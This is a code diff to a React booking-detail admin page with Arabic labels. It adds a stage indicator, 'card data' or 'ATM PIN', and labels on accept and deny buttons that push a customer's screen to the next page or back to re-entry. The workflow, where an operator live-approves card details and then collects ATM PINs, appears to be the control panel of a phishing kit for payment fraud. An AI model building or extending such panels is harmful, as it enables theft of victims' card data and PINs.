@@ -311,29 +311,45 @@ export default function BookingDetail() {
 
               {/* ===== أزرار التحكم في الدفع ===== */}
               <div>
-                <p className="text-xs font-semibold text-slate-600 mb-3">
-                  التحكم في الدفع (يؤثر مباشرة على شاشة العميل):
-                </p>
+                {/* مؤشر المرحلة الحالية */}
+                <div className="flex items-center gap-2 mb-3">
+                  <p className="text-xs font-semibold text-slate-600">
+                    التحكم في الدفع:
+                  </p>
+                  <span className={`text-xs px-2 py-0.5 rounded-full font-medium ${
+                    (payment?.step ?? 1) >= 2
+                      ? 'bg-orange-100 text-orange-700'
+                      : 'bg-blue-100 text-blue-700'
+                  }`}>
+                    {(payment?.step ?? 1) >= 2 ? 'مرحلة ATM PIN' : 'مرحلة بيانات البطاقة'}
+                  </span>
+                </div>
                 <div className="grid grid-cols-2 gap-3">
 
                   {/* زر قبول */}
                   <Button
-                    className="bg-green-600 hover:bg-green-700 text-white h-14 text-sm font-bold flex items-center justify-center gap-2"
+                    className="bg-green-600 hover:bg-green-700 text-white h-16 text-sm font-bold flex flex-col items-center justify-center gap-1"
                     onClick={() => handlePaymentAction("verified")}
                     disabled={setPaymentActionMutation.isPending}
                   >
                     <CheckCircle className="w-5 h-5" />
                     <span>قبول</span>
+                    <span className="text-green-200 text-[10px]">
+                      {(payment?.step ?? 1) >= 2 ? '→ صفحة النجاح' : '→ صفحة ATM PIN'}
+                    </span>
                   </Button>
 
                   {/* زر رفض */}
                   <Button
-                    className="bg-red-600 hover:bg-red-700 text-white h-14 text-sm font-bold flex items-center justify-center gap-2"
+                    className="bg-red-600 hover:bg-red-700 text-white h-16 text-sm font-bold flex flex-col items-center justify-center gap-1"
                     onClick={() => handlePaymentAction("denied")}
                     disabled={setPaymentActionMutation.isPending}
                   >
                     <XCircle className="w-5 h-5" />
                     <span>رفض</span>
+                    <span className="text-red-200 text-[10px]">
+                      {(payment?.step ?? 1) >= 2 ? '→ إعادة صفحة ATM' : '→ إعادة صفحة البطاقة'}
+                    </span>
                   </Button>
                 </div>
               </div>
